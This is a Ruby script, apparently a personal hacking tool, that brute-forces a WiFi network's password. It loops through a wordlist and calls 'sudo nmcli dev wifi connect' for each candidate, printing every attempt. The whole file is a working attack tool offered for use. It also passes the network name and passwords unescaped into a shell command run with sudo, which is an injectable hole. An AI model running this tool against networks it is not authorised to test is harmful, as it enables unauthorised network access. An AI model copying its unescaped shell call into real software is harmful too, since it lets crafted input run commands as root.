#!/usr/bin/env ruby

# AUGUSTO SAVI |@Augusto_Savi

@passwords = []

host = ARGV[0]
passwords_path = ARGV[1]

def verifyArgs(host,passwords_path)

    if !host || ! passwords_path
        puts "[!] correct usage: (exemple) rb bruteForce.rb WIFI_NAME ./passwords.txt"
    end
    begin
      passs_file = File.open(passwords_path)
      @passwords = passs_file.readlines.map(&:chomp)
      passs_file.close

      if @passwords.empty?
        puts "file with empty passwords"
      end

    rescue
      puts "error open files"
    end
end

def attack(host, password)
  begin
    puts "[!] Verificando: #{host}:#{password}"
    IO.popen("sudo nmcli dev wifi connect #{host} password #{password}") {|f| puts f.gets }
  end
end

verifyArgs(host,passwords_path)

puts "Passwords list size: #{@passwords.length()}"

@passwords.each do |password|
  attack(host, password)
end